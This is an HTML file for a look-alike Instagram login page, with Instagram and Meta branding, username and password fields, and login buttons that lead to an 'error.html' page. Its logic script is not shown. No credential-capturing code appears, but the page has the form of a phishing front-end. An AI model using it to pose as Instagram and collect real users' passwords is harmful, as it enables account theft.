<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
</head>
<body>

    <div class="main-wrapper">
        <!-- Left Side: Visuals & Branding Section -->
        <div class="hero-section">
            <div class="branding-container">
                <!-- Official Instagram Icon for Dark Theme -->
                <img src="insta.png" alt="Instagram" class="insta-icon">
                <h1 class="hero-text">See everyday moments from your <span class="gradient-text">close friends.</span></h1>
            </div>
            
            <!-- Dynamic Image Mockup Stack -->
            <div class="mockup-stack">
                <div class="card card-back-left">
                    <img id="bgImgLeft" src="https://unsplash.com" alt="Friend Moment">
                </div>
                <div class="card card-back-right">
                    <img id="bgImgRight" src="https://unsplash.com" alt="Friend Moment">
                </div>
                <div class="card card-front">
                    <img id="mainImg" src="https://unsplash.com" alt="Featured Moment">
                    <!-- Overlay decorative buttons matching the screenshot UI -->
                    <div class="card-overlay-badge top-left"><i class="fa-regular fa-comment-dots"></i> 😍</div>
                    <div class="card-overlay-badge bottom-left"><i class="fa-regular fa-heart"></i></div>
                    <div class="card-overlay-badge right-mid"><i class="fa-regular fa-star"></i></div>
                    <div class="card-overlay-badge bottom-right"></div>
                </div>
            </div>
        </div>

        <!-- Right Side: Authentication Panel -->
        <div class="auth-section">
            <div class="login-box">
                <h2 class="login-title">Log into Instagram</h2>
                
                <form id="loginForm" class="auth-form">
                    <!-- Input fields with dynamic active border highlights -->
                    <div class="input-group">
                        <input type="text" id="username" required placeholder=" ">
                        <label for="username">Mobile number, username or email</label>
                    </div>

                    <div class="input-group">
                        <input type="password" id="password" required placeholder=" ">
                        <label for="password">Password</label>
                        <button type="button" id="togglePassword" class="hide-show-btn">Show</button>
                    </div>

                    <button type="submit" class="login-btn" id="loginBtn"><a href="error.html">Log in</a></button>
                </form>

                <div class="divider">
                    <span></span>
                    <p>OR</p>
                    <span></span>
                </div>

                <!-- Facebook login variant -->
                <button class="fb-login-btn">
                    <i class="fa-brands fa-square-facebook"></i> <a href="error.html">Log in with Facebook</a>
                </button>

                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <!-- Create Account Container -->
            <div class="signup-box">
                <p>Don't have an account? <a href="#" id="createAccountBtn">Create new account</a></p>
            </div>

            <!-- Footer Meta Branding -->
            <footer class="auth-footer">
                <div class="meta-brand">
                    <i class="fa-brands fa-meta"></i> <span>Meta</span>
                </div>
            </footer>
        </div>
    </div>

    <!-- Link to external logic file -->
    <script src="script.js"></script>
</body>
</html>
